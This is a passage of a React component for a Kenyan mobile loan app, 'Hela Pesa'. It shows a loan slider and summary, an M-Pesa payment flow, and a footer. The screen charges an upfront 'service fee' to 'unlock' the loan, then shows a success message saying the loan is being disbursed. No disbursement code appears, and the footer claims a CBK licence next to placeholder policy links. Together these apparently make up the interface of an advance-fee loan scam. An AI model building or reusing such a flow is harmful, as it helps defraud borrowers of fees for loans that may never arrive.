          const total = reducedAmount + interest;
          return (
            <motion.div key="final" initial={{ opacity: 0, y: 50 }} animate={{ opacity: 1, y: 0 }} className="page-transition">
              <LogoHeader />
              <div className="card glass">
                <h2 style={{ color: 'var(--primary)', marginBottom: '0.3rem' }}>Loan Configuration</h2>
                <p className="subtitle" style={{ marginBottom: '1.2rem' }}>Adjust your amount. Service fee paid upfront unlocks your funds.</p>

                {/* Slider */}
                <div style={{ marginBottom: '1.2rem' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                    <label style={labelStyle}>Loan Amount (KSH)</label>
                    <span style={{ fontWeight: '800', color: 'var(--primary)', fontSize: '1.05rem' }}>
                      KSH {reducedAmount.toLocaleString()}
                    </span>
                  </div>
                  <input type="range" min="1000" max={loanLimit} step="100" value={reducedAmount}
                    onChange={(e) => setReducedAmount(parseInt(e.target.value))}
                    style={{ width: '100%', accentColor: 'var(--primary)', height: '6px' }} />
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.74rem', color: '#9ca3af', marginTop: '4px' }}>
                    <span>KSH 1,000</span><span>KSH {loanLimit.toLocaleString()}</span>
                  </div>
                </div>

                {/* Summary */}
                <div style={{ background: '#f3f4f6', padding: '18px', borderRadius: '14px' }}>
                  {[
                    ['Loan Amount', `KSH ${reducedAmount.toLocaleString()}`, ''],
                    ['Interest (18%)', `KSH ${interest.toLocaleString()}`, '#6366f1'],
                    ['Loan Period', `${period} Days`, ''],
                  ].map(([l, v, c]) => (
                    <div key={l} style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px' }}>
                      <span style={{ color: c || '#374151' }}>{l}</span>
                      <span style={{ fontWeight: '700', color: c || '#111827' }}>{v}</span>
                    </div>
                  ))}
                  <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px solid #ddd', paddingTop: '10px', marginTop: '2px' }}>
                    <span>Total Repayable</span>
                    <span style={{ fontWeight: '800', color: 'var(--primary)', fontSize: '1.1rem' }}>KSH {total.toLocaleString()}</span>
                  </div>
                  <div style={{ marginTop: '14px', padding: '12px', background: '#fff7ed', borderRadius: '10px', border: '1px solid #fed7aa' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', color: '#c2410c' }}>
                      <span style={{ fontWeight: '600' }}>⚡ Service Fee (M-Pesa)</span>
                      <span style={{ fontWeight: '800' }}>KSH {fee}</span>
                    </div>
                    <p style={{ fontSize: '0.77rem', color: '#9a3412', marginTop: '4px' }}>Paid once to activate your loan. Not part of repayment.</p>
                  </div>
                </div>

                {/* Payment states */}
                <div style={{ marginTop: '1.5rem' }}>
                  {paymentState === 'idle' && (
                    <>
                      <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', textAlign: 'center', marginBottom: '0.8rem' }}>
                        Payment processed securely via <strong>Payhero Kenya</strong> 🔐
                      </p>
                      <button className="btn btn-login" style={{ width: '100%', justifyContent: 'center' }} onClick={() => handlePayhero(fee)}>
                        Pay KSH {fee} &amp; Get Loan
                      </button>
                    </>
                  )}
                  {paymentState === 'sending' && (
                    <div style={{ textAlign: 'center', padding: '20px' }}>
                      <div style={{ width: 40, height: 40, border: '4px solid #e5e7eb', borderTop: '4px solid var(--primary)', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 12px' }} />
                      <p style={{ fontWeight: '600', color: 'var(--primary)' }}>Sending STK Push…</p>
                      <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)' }}>Contacting PayHero servers</p>
                    </div>
                  )}
                  {paymentState === 'awaiting' && (
                    <div style={{ textAlign: 'center', padding: '20px', background: '#f0fdf4', borderRadius: '12px', border: '1px solid #bbf7d0' }}>
                      <div style={{ width: 40, height: 40, border: '4px solid #bbf7d0', borderTop: '4px solid #16a34a', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 12px' }} />
                      <p style={{ fontWeight: '700', color: '#15803d', fontSize: '1.1rem' }}>📱 Check Your Phone!</p>
                      <p style={{ fontSize: '0.88rem', color: '#166534', marginTop: '6px' }}>
                        M-Pesa prompt sent to <strong>{formData.phoneNumber}</strong>.<br />
                        Enter your PIN to pay <strong>KSH {fee}</strong>.
                      </p>
                      <p style={{ fontSize: '0.76rem', color: '#4ade80', marginTop: '10px' }}>Waiting for confirmation…</p>
                    </div>
                  )}
                  {paymentState === 'success' && (
                    <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }}
                      style={{ textAlign: 'center', padding: '24px', background: '#f0fdf4', borderRadius: '12px', border: '1px solid #bbf7d0' }}>
                      <CheckCircle size={50} color="#16a34a" style={{ margin: '0 auto 12px' }} />
                      <p style={{ fontWeight: '800', color: '#15803d', fontSize: '1.2rem' }}>Payment Confirmed! 🎉</p>
                      <p style={{ fontSize: '0.88rem', color: '#166534', marginTop: '8px' }}>
                        KSH <strong>{reducedAmount.toLocaleString()}</strong> loan being disbursed to <strong>{formData.phoneNumber}</strong>.
                      </p>
                      <p style={{ fontSize: '0.76rem', color: '#4ade80', marginTop: '8px' }}>
                        Repay KSH {total.toLocaleString()} within {period} days.
                      </p>
                    </motion.div>
                  )}
                  {paymentState === 'error' && (
                    <div style={{ textAlign: 'center', padding: '16px', background: '#fef2f2', borderRadius: '12px', border: '1px solid #fecaca' }}>
                      <p style={{ fontWeight: '700', color: '#dc2626' }}>⚠️ Payment Issue</p>
                      <p style={{ fontSize: '0.85rem', color: '#991b1b', marginTop: '6px' }}>{paymentError}</p>
                      <button className="btn" style={{ marginTop: '14px', background: '#dc2626', color: 'white', fontSize: '0.9rem' }}
                        onClick={() => { setPaymentState('idle'); setPaymentError(''); }}>
                        Try Again
                      </button>
                    </div>
                  )}
                </div>
              </div>
            </motion.div>
          );
        })()}

      </AnimatePresence>

      <footer style={{ marginTop: 'auto', padding: '30px 8%', borderTop: '1px solid #eee', background: 'white' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', flexWrap: 'wrap', gap: '16px', alignItems: 'center' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <img src="/logo.png" alt="Hela Pesa Logo" style={{ width: '36px', borderRadius: '8px' }} />
            <div>
              <div style={{ fontWeight: '800', color: 'var(--primary)', fontSize: '1.1rem' }}>hela pesa</div>
              <p style={{ color: 'var(--text-muted)', fontSize: '0.82rem' }}>© 2026 Hela Pesa Kenya. Licensed by CBK.</p>
            </div>
          </div>
          <div style={{ display: 'flex', gap: '20px' }}>
            <a href="#" style={{ color: 'var(--text-muted)', textDecoration: 'none', fontSize: '0.88rem' }}>Privacy Policy</a>
            <a href="#" style={{ color: 'var(--text-muted)', textDecoration: 'none', fontSize: '0.88rem' }}>Terms of Service</a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default HelaPesa;
